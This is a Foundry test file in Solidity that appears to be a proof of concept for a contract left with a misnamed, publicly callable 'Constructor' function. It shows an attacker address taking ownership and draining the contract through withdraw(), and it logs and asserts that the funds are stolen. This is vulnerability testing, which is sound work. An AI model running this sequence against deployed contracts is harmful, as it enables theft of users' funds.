// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/incorrect_constructor_name3.sol";

contract MissingTest is Test {
    Missing public target;
    address public owner = makeAddr("owner");
    address public attacker = makeAddr("attacker");
    uint public constant TEST_AMOUNT = 1 ether;

    function setUp() public {
        target = new Missing();
    }

    function test_anyone_can_claim_ownership_and_steal_funds() public {
        console2.log("--- BEFORE-Trigger state ---");
        uint256 initialTargetBalance = address(target).balance;
        uint256 initialAttackerBalance = attacker.balance;
        console2.log("Initial contract balance:", initialTargetBalance);
        console2.log("Initial attacker balance:", initialAttackerBalance);

        console2.log("--- Performing actions (send funds -> claim ownership -> steal funds) ---");
        // Send funds to the contract via the receive function
        vm.deal(address(target), TEST_AMOUNT);

        // Attacker calls the exposed Constructor() to become owner
        vm.prank(attacker);
        target.Constructor();

        console2.log("--- DURING-Trigger state (after ownership claim) ---");
        console2.log("Contract balance after funding:", address(target).balance);
        console2.log("Attacker balance before withdraw:", attacker.balance);

        // Attacker steals funds through the withdraw() function
        vm.prank(attacker);
        target.withdraw();

        console2.log("--- AFTER-Trigger state ---");
        uint256 finalTargetBalance = address(target).balance;
        uint256 finalAttackerBalance = attacker.balance;
        console2.log("Final contract balance:", finalTargetBalance);
        console2.log("Final attacker balance:", finalAttackerBalance);

        // Compare state changes for vulnerability confirmation
        bool fundsStolen = finalTargetBalance == 0 && 
                          finalAttackerBalance == initialAttackerBalance + TEST_AMOUNT;

        // Final vulnerability verdict
        if (fundsStolen) {
            console2.log("Vulnerability Exists: Attacker successfully claimed ownership and stole contract funds");
        } else {
            console2.log("Vulnerability not Exist: Funds not stolen or incorrect balance changes detected");
        }

        // Original Test Assertions (retained)
        assertEq(address(target).balance, 0, "All funds should be withdrawn");
        assertEq(
            attacker.balance, 
            initialAttackerBalance + TEST_AMOUNT, 
            "Attacker should receive stolen funds"
        );
    }
}